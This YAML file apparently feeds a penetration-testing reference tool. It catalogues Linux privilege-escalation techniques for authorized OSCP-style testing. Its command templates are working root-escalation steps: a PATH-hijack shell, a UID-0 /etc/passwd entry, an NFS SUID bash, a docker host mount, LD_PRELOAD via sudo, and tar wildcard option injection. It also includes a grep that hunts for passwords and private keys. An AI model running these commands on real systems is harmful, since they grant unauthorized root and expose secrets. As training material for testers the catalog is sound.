# Cephalo content — Linux privilege-escalation catalog (LX-7 remainder).
# Authorized testing only. Cross-link GTFOBins. Per-box CVEs are named in prose
# (PwnKit / Baron Samedit) with the CVE id in the cited reference; confidence:'unverified'.
sections:
  - id: linux.p6b
    title: Linux PrivEsc — vector catalog
    os: linux
    phase: privilege-escalation
    order: 62
    description: Capabilities, PATH, writable passwd, NFS, containers, LD_PRELOAD, systemd, kernel CVEs.
    techniques:
      - linux.privesc.caps
      - linux.privesc.path
      - linux.privesc.passwd
      - linux.privesc.nfs
      - linux.privesc.docker
      - linux.privesc.ldpreload
      - linux.privesc.systemd
      - linux.privesc.wildcard
      - linux.privesc.suidcustom
      - linux.privesc.creds
      - linux.privesc.pwnkit
      - linux.privesc.sudocve
    packs: [oscp]

techniques:
  - id: linux.privesc.caps
    title: Linux capabilities
    os: [linux]
    phase: privilege-escalation
    summary: Find file capabilities (cap_setuid etc.) and abuse them via GTFOBins.
    commands: [linux.privesc.caps.find]
    tags: [privesc, suid]
    archetypeBand: high
    references: [ref.gtfobins, ref.hacktricks]
    confidence: verified
    packs: [oscp]

  - id: linux.privesc.path
    title: PATH hijacking
    os: [linux]
    phase: privilege-escalation
    summary: A SUID/sudo binary calling another by relative name → drop a malicious one in $PATH.
    body: |
      If a privileged binary invokes a command without an absolute path, prepend a
      writable directory to $PATH and place a same-named script there.
    commands: [linux.privesc.path.hijack]
    tags: [privesc]
    archetypeBand: high
    references: [ref.hacktricks]
    confidence: verified
    packs: [oscp]

  - id: linux.privesc.passwd
    title: Writable /etc/passwd or /etc/shadow
    os: [linux]
    phase: privilege-escalation
    summary: Add a UID-0 user (passwd) or crack/replace a hash (shadow).
    commands: [linux.privesc.passwd.addroot]
    tags: [privesc]
    archetypeBand: high
    references: [ref.hacktricks]
    confidence: verified
    packs: [oscp]

  - id: linux.privesc.nfs
    title: NFS no_root_squash
    os: [linux]
    phase: privilege-escalation
    summary: On a no_root_squash export, drop a root-owned SUID binary from your box.
    body: |
      With root on your own host and an export mounted, create a root-owned SUID
      shell in the export; it executes as root on the target.
    commands: [linux.privesc.nfs.suid]
    tags: [privesc, nfs]
    archetypeBand: high
    references: [ref.hacktricks]
    confidence: verified
    packs: [oscp]
    relatedIds: [linux.enum.nfs]

  - id: linux.privesc.docker
    title: Docker / LXD group escape
    os: [linux]
    phase: privilege-escalation
    summary: Membership in docker/lxd ≈ root — mount the host filesystem from a container.
    commands: [linux.privesc.docker.mount]
    tags: [privesc]
    archetypeBand: high
    references: [ref.gtfobins, ref.hacktricks]
    confidence: verified
    packs: [oscp]

  - id: linux.privesc.ldpreload
    title: LD_PRELOAD / LD_LIBRARY_PATH
    os: [linux]
    phase: privilege-escalation
    summary: When sudo keeps LD_PRELOAD (env_keep), load a malicious shared object as root.
    commands: [linux.privesc.ldpreload.run]
    tags: [privesc, sudo]
    archetypeBand: high
    references: [ref.hacktricks]
    confidence: verified
    packs: [oscp]

  - id: linux.privesc.systemd
    title: Writable service / systemd unit
    os: [linux]
    phase: privilege-escalation
    summary: A writable unit file or service binary run by root → code execution as root.
    commands: [linux.privesc.systemd.find]
    tags: [privesc]
    archetypeBand: medium
    references: [ref.hacktricks]
    confidence: verified
    packs: [oscp]

  - id: linux.privesc.wildcard
    title: Cron wildcard injection
    os: [linux]
    phase: privilege-escalation
    summary: A root cron that globs `*` in a writable dir → smuggle option args (tar/rsync/chown).
    body: |
      When a root job runs e.g. `tar cf backup.tar *` in a directory you can write,
      drop files named like options (`--checkpoint-action=...`) so the wildcard
      expands into argument injection. The tar/GTFOBins entry shows the exact files.
    commands: [linux.privesc.wildcard.tar]
    tags: [privesc, cron]
    archetypeBand: high
    references: [ref.gtfobins, ref.hacktricks]
    confidence: verified
    packs: [oscp]

  - id: linux.privesc.suidcustom
    title: Custom SUID binary analysis
    os: [linux]
    phase: privilege-escalation
    summary: Reverse a non-standard SUID binary for relative calls, injectable args, or secrets.
    commands: [linux.privesc.suidcustom.analyze]
    tags: [privesc, suid]
    archetypeBand: medium
    references: [ref.gtfobins]
    confidence: verified
    packs: [oscp]

  - id: linux.privesc.creds
    title: Password reuse & creds in files
    os: [linux]
    phase: privilege-escalation
    summary: Hunt configs/history/DBs for reusable passwords and keys.
    commands: [linux.privesc.creds.grep]
    tags: [privesc, creds]
    archetypeBand: high
    references: [ref.hacktricks]
    confidence: verified
    packs: [oscp]

  - id: linux.privesc.pwnkit
    title: pkexec PwnKit (version-gated)
    os: [linux]
    phase: privilege-escalation
    summary: A well-known pkexec local privilege escalation — applies only to specific builds.
    body: |
      PwnKit is a memory-corruption local privilege escalation in pkexec. It is
      build-specific; confirm the target's pkexec version and patch level before
      relying on it. See the cited advisory for the exact affected range.
    commands: [linux.privesc.pwnkit.check]
    tags: [privesc]
    archetypeBand: medium
    references: [ref.cve-pwnkit, ref.nvd]
    confidence: unverified
    packs: [oscp]

  - id: linux.privesc.sudocve
    title: sudo Baron Samedit (version-gated)
    os: [linux]
    phase: privilege-escalation
    summary: A heap overflow in sudo — applies only to specific sudo versions.
    body: |
      Baron Samedit is a sudo heap overflow reachable without sudo rights on affected
      versions. Check the sudo version against the advisory before assuming exploitability.
    commands: [linux.privesc.sudocve.check]
    tags: [privesc, sudo]
    archetypeBand: low
    references: [ref.cve-baronsamedit, ref.nvd]
    confidence: unverified
    packs: [oscp]

commands:
  - id: linux.privesc.caps.find
    title: Enumerate capabilities
    template: "getcap -r / 2>/dev/null"
    description: List file capabilities; match hits against the GTFOBins capabilities section.
    os: [linux]
    phase: privilege-escalation
    tags: [privesc]
    confidence: verified
    references: [ref.gtfobins]
    danger: low
    packs: [oscp]
  - id: linux.privesc.path.hijack
    title: PATH hijack (template)
    template: "export PATH=/tmp:$PATH; printf '#!/bin/sh\\n/bin/sh' > /tmp/{{TARGET_USER}}; chmod +x /tmp/{{TARGET_USER}}"
    description: Drop a writable-dir binary named after the relative call the SUID makes.
    os: [linux]
    phase: privilege-escalation
    tags: [privesc]
    notes:
      - "Name the script after the exact command the privileged binary calls."
    confidence: verified
    references: [ref.hacktricks]
    danger: high
    packs: [oscp]
  - id: linux.privesc.passwd.addroot
    title: Add a UID-0 user
    template: "openssl passwd 'Cephalo-Lab-Pw1!'"
    description: Generate a crypt hash; append a UID-0 line to a writable /etc/passwd.
    os: [linux]
    phase: privilege-escalation
    tags: [privesc]
    notes:
      - "Append: root2:<hash>:0:0::/root:/bin/bash  then `su root2`."
    confidence: verified
    references: [ref.hacktricks]
    danger: critical
    packs: [oscp]
  - id: linux.privesc.nfs.suid
    title: Root-SUID drop over NFS
    template: "cp /bin/bash /mnt/nfs/rootbash && chmod +s /mnt/nfs/rootbash"
    description: As local root on the mounted export, plant a SUID shell; run it on the target.
    os: [linux]
    phase: privilege-escalation
    tags: [privesc, nfs]
    notes:
      - "On the target: /export/rootbash -p"
    confidence: verified
    references: [ref.hacktricks]
    danger: critical
    packs: [oscp]
  - id: linux.privesc.docker.mount
    title: Docker host-filesystem mount
    template: "docker run -v /:/mnt --rm -it alpine chroot /mnt sh"
    tool: docker
    description: Mount the host root into a container for full filesystem access as root.
    os: [linux]
    phase: privilege-escalation
    tags: [privesc]
    confidence: verified
    references: [ref.gtfobins]
    danger: critical
    packs: [oscp]
  - id: linux.privesc.ldpreload.run
    title: LD_PRELOAD via sudo
    template: "sudo LD_PRELOAD=/tmp/pe.so {{TARGET_USER}}"
    description: With env_keep+=LD_PRELOAD, load a malicious .so when running an allowed sudo command.
    os: [linux]
    phase: privilege-escalation
    tags: [privesc, sudo]
    notes:
      - "Compile a .so whose constructor sets uid 0 and execs a shell."
    confidence: verified
    references: [ref.hacktricks]
    danger: critical
    packs: [oscp]
  - id: linux.privesc.systemd.find
    title: Find writable units/binaries
    template: "find /etc/systemd /lib/systemd -writable -type f 2>/dev/null; systemctl list-units --type=service"
    description: Locate a writable unit or service binary that root runs.
    os: [linux]
    phase: privilege-escalation
    tags: [privesc]
    confidence: verified
    references: [ref.hacktricks]
    danger: medium
    packs: [oscp]
  - id: linux.privesc.wildcard.tar
    title: tar wildcard injection (pointer)
    template: "echo '' > '--checkpoint=1'; echo '' > '--checkpoint-action=exec=sh runme.sh'"
    description: Drop option-named files so a root `tar ... *` job executes your script.
    os: [linux]
    phase: privilege-escalation
    tags: [privesc, cron]
    confidence: verified
    references: [ref.gtfobins]
    danger: high
    packs: [oscp]
  - id: linux.privesc.suidcustom.analyze
    title: Analyze a custom SUID
    template: "strings {{TARGET_USER}}; ltrace -f {{TARGET_USER}} 2>&1 | head"
    description: Inspect a non-standard SUID for relative calls, system() args, or secrets.
    os: [linux]
    phase: privilege-escalation
    tags: [privesc, suid]
    confidence: verified
    references: [ref.gtfobins]
    danger: low
    packs: [oscp]
  - id: linux.privesc.creds.grep
    title: Grep for secrets
    template: "grep -rinE 'password|passwd|secret|api[_-]?key|BEGIN (RSA|OPENSSH)' /home /var/www /etc /opt 2>/dev/null"
    description: Hunt readable files for reusable credentials and private keys.
    os: [linux]
    phase: privilege-escalation
    tags: [privesc, creds]
    confidence: verified
    references: [ref.hacktricks]
    danger: low
    packs: [oscp]
  - id: linux.privesc.pwnkit.check
    title: Check pkexec (PwnKit)
    template: "ls -l /usr/bin/pkexec; pkexec --version"
    description: Confirm pkexec is present + its version before matching the PwnKit advisory.
    os: [linux]
    phase: privilege-escalation
    tags: [privesc]
    notes:
      - "Build-specific — match the version to the cited advisory; never run an unmatched exploit."
    confidence: unverified
    references: [ref.cve-pwnkit, ref.nvd]
    danger: high
    packs: [oscp]
  - id: linux.privesc.sudocve.check
    title: Check sudo (Baron Samedit)
    template: "sudo --version | head -1"
    description: Read the sudo version to compare against the advisory's affected range.
    os: [linux]
    phase: privilege-escalation
    tags: [privesc, sudo]
    notes:
      - "Version-gated — confirm against the cited advisory before exploiting."
    confidence: unverified
    references: [ref.cve-baronsamedit, ref.nvd]
    danger: high
    packs: [oscp]
